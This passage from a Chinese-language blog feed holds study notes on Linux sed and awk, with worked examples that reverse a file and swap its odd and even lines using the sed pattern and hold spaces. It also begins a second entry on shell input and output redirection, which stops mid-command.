style="text-align:center"><code>-r</code></td><td>使用扩展正则表达式，默认为标准正则表达式</td></tr><tr><td style="text-align:center"><code>-i</code></td><td>将直接修改输入文件内容，而不是打印到标准输出设备</td></tr></tbody></table><h4 id="执行命令">执行命令</h4><ul><li><p><code>sed</code>命令中可以有单条或多条执行命令，每条执行命令之间使用<code>;</code>分隔，执行命令格式如下：</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[n1]</span><span class="selector-attr">[,n2]</span>command</span><br><span class="line"><span class="selector-attr">[n1]</span><span class="selector-attr">[~step]</span>command</span><br></pre></td></tr></table></figure><p>其中n1,n2表示输入内容的行号，它们之间为<code>,</code>逗号则表示从n1到n2行，如果为<code>～</code>波浪号则表示从n1开始以step为步进的所有行；command为执行动作。</p></li><li><p>其中一些命令可以在后面加上作用范围，比如：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/sad/happy/g&#x27;</span> <span class="built_in">test</span></span><br><span class="line">sed -i <span class="string">&#x27;s/sad/happy/4&#x27;</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>其中，第一句命令的<code>g</code>表示全局范围，第二句命令的<code>4</code>表示指定行中第四个匹配的字符串，上面两句都是将范围内的<code>sad</code>更改为<code>happy</code>。</p></li><li><p>下面为一些常用动作指令：</p></li></ul><table><thead><tr><th style="text-align:center">命令</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>s</code></td><td>行内替换</td></tr><tr><td style="text-align:center"><code>c</code></td><td>整行替换</td></tr><tr><td style="text-align:center"><code>a</code></td><td>插入到指定行的后面</td></tr><tr><td style="text-align:center"><code>i</code></td><td>插入到指定行的前面</td></tr><tr><td style="text-align:center"><code>p</code></td><td>打印指定行，通常与<code>-n</code>参数配合使用</td></tr><tr><td style="text-align:center"><code>d</code></td><td>删除指定行</td></tr></tbody></table><h4 id="操作举例">操作举例</h4><ul><li><p>首先得到一个用于测试的文本文件：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="regexp">/etc/</span>passwd ~</span><br></pre></td></tr></table></figure></li><li><p>打印指定行（2-5）：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nl</span> passwd | sed -n &#x27;<span class="number">2</span>,<span class="number">5</span>p&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124195346741.png" alt="image-20231124195346741"></p></li><li><p>打印奇数行：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nl</span> passwd | sed -n &#x27;<span class="number">1</span>~<span class="number">2</span>p&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124195457985.png" alt="image-20231124195457985"></p></li><li><p>行内替换，将输入文本中&quot;shiyanlou&quot; 全局替换为&quot;hehe&quot;,并只打印替换的那一行，注意这里不能省略最后的&quot;p&quot;命令：</p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sed</span> -n <span class="string">&#x27;s/shiyanlou/hehe/gp&#x27;</span> passwd</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124195627471.png" alt="image-20231124195627471"></p></li><li><p>删除某行（30）：</p>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nl passwd <span class="string">| grep &quot;</span>shiyanlou<span class="string">&quot;</span></span><br><span class="line">sed -i &#x27;30d&#x27; passwd</span><br><span class="line">nl passwd <span class="string">| grep &quot;</span>shiyanlou<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124195906463.png" alt="image-20231124195906463"></p></li></ul><h3 id="awk文本处理语言">awk文本处理语言</h3><h4 id="简单介绍">简单介绍</h4><blockquote><p><code>AWK</code>是一种优良的文本处理工具，Linux及Unix环境中现有的功能最强大的数据处理引擎之一，其名称得自于它的创始人Alfred Aho（阿尔佛雷德·艾侯）、Peter Jay Weinberger（彼得·温伯格）和Brian Wilson Kernighan（布莱恩·柯林汉）姓氏的首个字母.AWK程序设计语言，三位创建者已将它正式定义为“样式扫描和处理语言”，它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。最简单地说，AWK是一种用于处理文本的编程语言工具。</p></blockquote><ul><li><p>在大多数linux发行版上面，实际使用的是gawk（GNU awk，awk的GNU版本），在ubuntu环境上，默认提供的是mawk，系统已经创建好了<code>awk</code>指向mawk的符号链接：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll <span class="regexp">/usr/</span>bin/awk</span><br></pre></td></tr></table></figure></li></ul><h4 id="基础概念">基础概念</h4><ul><li><p><code>awk</code>所有的操作都是基于pattern(模式)—action(动作)对来完成的，如下面的形式：</p>  <figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pattern</span> &#123;action&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>awk</code>处理文本的方式，是将文本分割成一些“字段”，然后再对这些字段进行处理，默认情况下，<code>awk</code>以空格作为一个字段的分割符，不过这不是固定的，你可以任意指定分隔符。</p></li></ul><h4 id="基本格式">基本格式</h4><ul><li><p><code>awk</code>命令的基本格式如下：</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="selector-attr">[-F fs]</span> <span class="selector-attr">[-v var=value]</span> <span class="selector-attr">[-f prog-file | <span class="string">&#x27;program text&#x27;</span>]</span> <span class="selector-attr">[file...]</span></span><br></pre></td></tr></table></figure><p>其中<code>-F</code>参数用于预先指定前面提到的字段分隔符（还有其他指定字段的方式） ，<code>-v</code>用于预先为<code>awk</code>程序指定变量，<code>-f</code>参数用于指定<code>awk</code>命令要执行的程序文件，或者在不加<code>-f</code>参数的情况下直接将程序语句放在这里，最后为<code>awk</code>需要处理的文本输入，且可以同时输入多个文本文件。</p></li></ul><h4 id="具体操作">具体操作</h4><ul><li><p>先用<code>vim</code>新建一个文本文档：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>输入如下内容：</p>  <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I <span class="keyword">like</span> linux</span><br><span class="line">www.shiyanlou.com</span><br></pre></td></tr></table></figure><p>按下<kbd>Esc</kbd>，输入<code>:wq</code>保存并退出</p></li><li><p>使用<code>awk</code>将文本内容打印到终端：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print&#125;&#x27;</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124201201455.png" alt="image-20231124201201455"></p></li><li><p>将test的第一行的每个字段单独显示为一行，其他行则直接显示：</p>  <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="type">NR</span><span class="operator">==</span><span class="number">1</span>)&#123;</span><br><span class="line">print <span class="variable">$1</span> <span class="string">&quot;<span class="subst">\n</span>&quot;</span> <span class="variable">$2</span> <span class="string">&quot;<span class="subst">\n</span>&quot;</span> <span class="variable">$3</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">print&#125;</span><br><span class="line">&#125;&#x27; test</span><br></pre></td></tr></table></figure><p>或者：</p>  <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="type">NR</span><span class="operator">==</span><span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">OFS</span><span class="operator">=</span><span class="string">&quot;<span class="subst">\n</span>&quot;</span></span><br><span class="line">print <span class="variable">$1</span>, <span class="variable">$2</span>, <span class="variable">$3</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">print&#125;</span><br><span class="line">&#125;&#x27; test</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124224624617.png" alt="image-20231124224624617"></p></li><li><p>将test的第二行的以点为分段的字段换成以tab为分隔：</p>  <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="operator">-</span><span class="type">F</span>&#x27;.&#x27; &#x27;&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="type">NR</span><span class="operator">==</span><span class="number">2</span>)&#123;</span><br><span class="line">print <span class="variable">$1</span> <span class="string">&quot;<span class="subst">\t</span>&quot;</span> <span class="variable">$2</span> <span class="string">&quot;<span class="subst">\t</span>&quot;</span> <span class="variable">$3</span></span><br><span class="line">&#125;&#125;&#x27; test</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124224952656.png" alt="image-20231124224952656"></p><p>或者：</p>  <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;</span><br><span class="line"><span class="type">BEGIN</span>&#123;</span><br><span class="line"><span class="type">FS</span><span class="operator">=</span><span class="string">&quot;.&quot;</span></span><br><span class="line"><span class="type">OFS</span><span class="operator">=</span><span class="string">&quot;<span class="subst">\t</span>&quot;</span></span><br><span class="line">&#125;&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="type">NR</span><span class="operator">==</span><span class="number">2</span>)&#123;</span><br><span class="line">print <span class="variable">$1</span>, <span class="variable">$2</span>, <span class="variable">$3</span></span><br><span class="line">&#125;&#125;&#x27; test</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124225037736.png" alt="image-20231124225037736"></p></li></ul><h4 id="常见内置变量">常见内置变量</h4><table><thead><tr><th style="text-align:center">变量名</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>FILENAME</code></td><td>当前输入文件名，若有多个文件，则只表示第一个。如果输入是来自标准输入，则为空字符串</td></tr><tr><td style="text-align:center"><code>$0</code></td><td>当前记录的内容</td></tr><tr><td style="text-align:center"><code>$N</code></td><td>N表示字段号，最大值为<code>NF</code>变量的值</td></tr><tr><td style="text-align:center"><code>FS</code></td><td>字段分隔符，由正则表达式表示，默认为&quot; &quot;空格</td></tr><tr><td style="text-align:center"><code>RS</code></td><td>输入记录分隔符，默认为<code>\n</code>，即一行为一个记录</td></tr><tr><td style="text-align:center"><code>NF</code></td><td>当前记录字段数</td></tr><tr><td style="text-align:center"><code>NR</code></td><td>已经读入的记录数</td></tr><tr><td style="text-align:center"><code>FNR</code></td><td>当前输入文件的记录数，请注意它与NR的区别</td></tr><tr><td style="text-align:center"><code>OFS</code></td><td>输出字段分隔符，默认为&quot; &quot;空格</td></tr><tr><td style="text-align:center"><code>ORS</code></td><td>输出记录分隔符，默认为<code>\n</code></td></tr></tbody></table><h2 id="实战训练">实战训练</h2><ol><li><p>辨析pattern space和hold space的概念</p><ul><li><p>Pattern space（模式空间）</p><ul><li><p>用于存储当前处理的文本行的缓冲区。在<code>sed</code>的处理过程中，文本逐行读取，每一行都被存储在Pattern space中，然后在Pattern space中进行模式匹配和操作。</p></li><li><p>当<code>sed</code>读取一行文本时，该行文本被放入Pattern space中，然后执行可能的操作，如查找和替换。处理完一行后，Pattern space中的内容可以被输出，也可以保留用于后续处理。</p></li></ul></li><li><p>Hold space（保持空间）</p><ul><li><p>用于在处理多行文本时保存额外的信息。与Pattern space不同，Hold space可以在不同的时刻存储不同的内容，而Pattern space则主要用于当前正在处理的行。</p></li><li><p><code>sed</code>提供的命令允许将Pattern space中的内容移动到Hold space中，反之亦然。这使得在处理多行文本时能够保留和操作先前处理的文本行的信息。</p></li></ul></li><li><p>在<code>sed</code>脚本中，可以使用<code>h</code>或<code>H</code>命令将Pattern space的内容转移到Hold space，使用<code>g</code>或<code>G</code>命令将Hold space的内容转移回Pattern space，区别如下：</p></li></ul></li></ol><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>g</code></td><td>将hold space中的内容拷贝到pattern space中，原来pattern space里的内容被覆盖</td></tr><tr><td><code>G</code></td><td>将hold space中的内容扩充到pattern space最后（换行）</td></tr><tr><td><code>h</code></td><td>将pattern space中的内容拷贝到hold space中，原来hold space里的内容被覆盖</td></tr><tr><td><code>H</code></td><td>将pattern space中的内容扩充到hold space最后（换行）</td></tr><tr><td><code>d</code></td><td>删除pattern space当前行，并读入下一新行到pattern space中</td></tr><tr><td><code>D</code></td><td>删除pattern space中的第一行，不读入下一行</td></tr></tbody></table><ol start="2"><li><p>基于pattern space和hold space实现将一个文本倒序输出</p><ul><li><p>新建一个文本，作为实验内容：</p>  <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vim testfile</span></span><br></pre></td></tr></table></figure></li><li><p>输入以下内容，然后保存文件：</p>  <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">li<span class="symbol">ne1</span></span><br><span class="line">li<span class="symbol">ne2</span></span><br><span class="line">li<span class="symbol">ne3</span></span><br><span class="line">li<span class="symbol">ne4</span></span><br><span class="line">li<span class="symbol">ne5</span></span><br><span class="line">li<span class="symbol">ne6</span></span><br></pre></td></tr></table></figure></li><li><p>查看写入内容：</p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">awk</span> <span class="string">&#x27;&#123;print&#125;&#x27;</span> testfile</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231125004735382.png" alt="image-20231125004735382"></p></li><li><p>我们执行<code>sed</code>命令时能看到的输出都为Pattern space中的内容（当前处理的文本行的缓冲区），因此思路为借助Hold space对Pattern space当前的内容进行操作。</p></li><li><p>那么当前Pattern space在开始执行时依次存储的内容如下：</p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">line1</span> <span class="comment">#第一次执行</span></span><br><span class="line">line2 <span class="comment">#第二次执行</span></span><br><span class="line">line3 <span class="comment">#第三次执行</span></span><br><span class="line">line4 <span class="comment">#第四次执行</span></span><br></pre></td></tr></table></figure></li><li><p>现在希望将第一行放到第二行的后方，Pattern space变为如下内容：</p>  <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">li<span class="symbol">ne1</span> <span class="attr">#第一次执行</span></span><br><span class="line"><span class="attr">line2</span>\<span class="symbol">nline1</span> <span class="attr">#第二次执行</span></span><br><span class="line"><span class="attr">line3</span></span><br><span class="line">li<span class="symbol">ne4</span></span><br></pre></td></tr></table></figure></li><li><p>那么经过多次执行操作，最后Pattern space期望变为内容如下：</p>  <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">li<span class="symbol">ne1</span> <span class="attr">#第一次执行</span></span><br><span class="line"><span class="attr">line2</span>\<span class="symbol">nline1</span> <span class="attr">#第二次执行</span></span><br><span class="line"><span class="attr">line3</span>\<span class="symbol">nline2</span>\<span class="symbol">nline1</span> <span class="attr">#第三次执行</span></span><br><span class="line"><span class="attr">line4</span>\<span class="symbol">nline3</span>\<span class="symbol">nline2</span>\<span class="symbol">nline1</span> <span class="attr">#第四次执行</span></span><br></pre></td></tr></table></figure><p>如果完成上述操作，则会输出内容如下：</p>  <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">li<span class="symbol">ne1</span></span><br><span class="line">li<span class="symbol">ne2</span></span><br><span class="line">li<span class="symbol">ne1</span></span><br><span class="line">li<span class="symbol">ne3</span></span><br><span class="line">li<span class="symbol">ne2</span></span><br><span class="line">li<span class="symbol">ne1</span></span><br><span class="line">li<span class="symbol">ne4</span></span><br><span class="line">li<span class="symbol">ne3</span></span><br><span class="line">li<span class="symbol">ne2</span></span><br><span class="line">li<span class="symbol">ne1</span></span><br></pre></td></tr></table></figure><p>由此看来，需要在每次扩展前一行到当前行的同时删除掉前一行的内容，最终仅保留最后一行的内容，即：</p>  <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一次执行后当前行被删除</span></span><br><span class="line"><span class="comment">#第二次执行后当前行被删除</span></span><br><span class="line"><span class="comment">#第三次执行后当前行被删除</span></span><br><span class="line">line4<span class="string">\nline3\nline2\nline1</span> <span class="comment">#第四次执行</span></span><br></pre></td></tr></table></figure></li><li><p>整理思路得到对每一行执行的操作如下：</p><ul><li>将当前行扩展到下一行（Pattern space）后方，中间使用<code>\n</code>分隔</li><li>删除当前行，然后读取下一行</li></ul></li><li><p>但是，需要注意以下两个问题：</p><ul><li><code>sed</code>命令中使用分号<code>;</code>分隔的多个语句（①;②;③）如执行顺序为：第一行的 ① -&gt; ② -&gt; ③，然后才是第二行的 ① -&gt; ② -&gt; ③，以此类推。因为Pattern space是逐行读取的。</li><li>使用程序完成第①步操作并非可以只用一步完成，应该是先在下一行后方添加换行符，然后将当前行内容扩展到下一行。</li></ul></li><li><p>但如果对每一行都添加换行符，那么最终在<code>line1</code>的后方会多出一个多余的换行符，因此<code>line1</code>的后方不应该添加换行符。同时“删除当前行”操作在直行道最后一行时，也不应该删除最后一行，否则会丢失所有行的内容。</p></li><li><p>那么最终的操作如下：</p><ul><li>在每一行（除了第一行）后增加一个换行符（可以理解为将空内容换行扩展到当前行后方）</li><li>将当前行内容不换行扩展到下一行后方</li><li>将当前行删除（除非是最后一行），然后移动到下一行</li></ul></li><li><p>这个步骤中的前两步也可以换种思路，其中暂存区借助Hold space实现：</p><ul><li>将暂存区（开始时为空）内容换行扩展到当前行（除了第一行）：<code>1!G</code>，第一行以外的行都执行G操作（将hold space中的内容换行扩充到pattern space最后）</li><li>将当前行内容暂存：<code>h</code>，全部行都执行h操作（将pattern space中的内容拷贝到hold space中，原来hold space里的内容被覆盖）</li><li>删除当前行，移动到下一行（除非是最后一行）：<code>$!d</code>，最后一行以外的行都执行d操作（删除pattern space当前行，并读入下一新行到pattern space中）</li></ul></li><li><p>因此完整命令如下：</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;<span class="number">1</span><span class="title">!G</span><span class="comment">;h;$!d&#x27; testfile</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231125024055225.png" alt="image-20231125024055225"></p></li></ul></li><li><p>基于pattern space和hold space实现交换奇数行和偶数行</p><ul><li><p>将当前行存储到暂存区：<code>h</code>（将pattern space中的内容拷贝到hold space中，原来hold space里的内容被覆盖）</p></li><li><p>如果不是最后一行，那么完成以下两步操作：</p><ul><li>移动到下一行：<code>n</code>（将pattern space中的内容切换到下一行）</li><li>在当前行末尾换行扩展暂存区内容：<code>G</code>（将hold space中的内容换行扩充到pattern space最后）</li></ul></li><li><p>显示当前行：<code>p</code></p></li><li><p>由于已经在命令执行过程中显示了需要的内容，那么无需在执行完成后依次显示Pattern space的内容：<code>-n</code>，否则会显示如下内容：</p>  <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">#原内容</span></span><br><span class="line"><span class="attr">line1</span></span><br><span class="line">li<span class="symbol">ne2</span></span><br><span class="line">li<span class="symbol">ne1</span></span><br><span class="line"><span class="attr">#使用p进行的打印</span></span><br><span class="line"><span class="attr">line2</span></span><br><span class="line">li<span class="symbol">ne1</span></span><br><span class="line"><span class="attr">#原内容</span></span><br><span class="line"><span class="attr">line3</span></span><br><span class="line">li<span class="symbol">ne4</span></span><br><span class="line">li<span class="symbol">ne3</span></span><br><span class="line"><span class="attr">#使用p进行的打印</span></span><br><span class="line"><span class="attr">line4</span></span><br><span class="line">li<span class="symbol">ne3</span></span><br><span class="line"><span class="attr">#原内容</span></span><br><span class="line"><span class="attr">line5</span></span><br><span class="line">li<span class="symbol">ne6</span></span><br><span class="line">li<span class="symbol">ne5</span></span><br><span class="line"><span class="attr">#使用p进行的打印</span></span><br><span class="line"><span class="attr">line6</span></span><br><span class="line">li<span class="symbol">ne5</span></span><br></pre></td></tr></table></figure></li><li><p>那么完整命令如下：</p>  <figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -<span class="built_in">n</span> &#x27;h;$!&#123;<span class="built_in">n</span>;G&#125;;p&#x27; testfile</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231125031850044.png" alt="image-20231125031850044"></p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux数据流重定向</title>
      <link href="/posts/5a9cd021.html"/>
      <url>/posts/5a9cd021.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>在之前的Linux笔记中有使用过<code>&gt;</code>、<code>&gt;&gt;</code>，比如如下指令：</p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;hello shiyanlou&#x27;</span> &gt; <span class="literal">redirect</span> </span><br><span class="line">echo <span class="string">&#x27;www.shiyanlou.com&#x27;</span> &gt;&gt; <span class="literal">redirect</span></span><br><span class="line">cat <span class="literal">redirect</span></span><br></pre></td></tr></table></figure><p>这部分命令用于将文本字符串 “hello shiyanlou” 输出到（<code>&gt;</code>）<code>redirect</code>文件中，此时文件并不存在，因此将自动创建<code>redirect</code>文件写入字符串，然后再次使用 <code>echo</code> 命令输出字符串<code>www.shiyanlou.com</code>追加到（<code>&gt;&gt;</code>）文件<code>redirect</code>中。</p></li></ul><h3 id="简单的重定向">简单的重定向</h3><ul><li>Linux中默认提供了三种特殊设备，用于终端的显示和输出，分别为<code>stdin</code>（标准输入,对应于你在终端的输入），<code>stdout</code>（标准输出，对应于终端的输出），<code>stderr</code>（标准错误输出，对应于终端的输出）。</li></ul><table><thead><tr><th style="text-align:center">文件描述符</th><th style="text-align:center">设备文件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>0</code></td><td style="text-align:center"><code>/dev/stdin</code></td><td style="text-align:center">标准输入</td></tr><tr><td style="text-align:center"><code>1</code></td><td style="text-align:center"><code>/dev/stdout</code></td><td style="text-align:center">标准输出</td></tr><tr><td style="text-align:center"><code>2</code></td><td style="text-align:center"><code>/dev/stderr</code></td><td style="text-align:center">标准错误</td></tr></tbody></table><ul><li><p>可以这样使用文件描述符，比如默认使用终端的标准输入和标准输出作为命令的输入和输出：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span></span><br></pre></td></tr></table></figure><p>此时输入的内容也会在按下<kbd>Enter</kbd>时显示出来。</p><p>（按下<kbd>Ctrl</kbd>+<kbd>C</kbd>退出）</p></li><li><p>将cat的连续输出（heredoc方式）重定向到一个文件：</p>  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir Documents</span><br><span class="line">cat &gt; Documents/test.c &lt;&lt;EOF</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>这一段内容的作用是将文件作为标准输出，那么之后输入的内容都会被保存在文件<code>/Documents/test.c</code>中，<code>&lt;&lt;EOF</code>是文本输入的定界符，表示以下内容将作为输入直到遇到 “EOF” 为止。</p></li><li><p>将一个文件作为命令的输入，标准输出作为命令的输出：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> Documents/test.c</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231117193411117.png" alt="image-20231117193411117"></p></li><li><p>将echo命令通过管道传过来的数据作为cat命令的输入，将标准输出作为命令的输出：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hi&#x27;</span> | <span class="built_in">cat</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231117193603353.png" alt="image-20231117193603353"></p></li><li><p>将echo命令的输出从默认的标准输出重定向到一个普通文件：</p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;hello shiyanlou&#x27;</span> &gt; <span class="literal">redirect</span></span><br><span class="line">cat <span class="literal">redirect</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231117193628856.png" alt="image-20231117193628856"></p></li></ul><h3 id="标准错误重定向">标准错误重定向</h3><ul><li><p>有时执行指令得到的输出同事包含了标准输出和标准错误，比如如下操作，使用<code>cat</code>命令同时读取两个文件，其中一个存在，另一个不存在：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> Documents/test.c hello.c</span><br></pre></td></tr></table></figure><p>可以看到除了正确输出了前一个文件的内容，还在末尾出现了一条错误信息.</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231117194508097.png" alt="image-20231117194508097"></p></li><li><p>接下来将输出重定向到一个文件：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> Documents/test.c hello.c &gt; somefile</span><br></pre></td></tr></table></figure><p>但是依然出现了错误信息，而查看重定指向的文件，已经写入了期望包含的内容</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231117195102336.png" alt="image-20231117195102336"></p></li><li><p>如果希望将错误或者警告都隐藏，那就可以用到前面提到的文件描述符了。将标准错误重定向到标准输出，再将标准输出重定向到文件，注意要将重定向到文件写到前面：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat</span> Documents/test.c hello.c &gt;somefile  <span class="number">2</span>&gt;&amp;<span 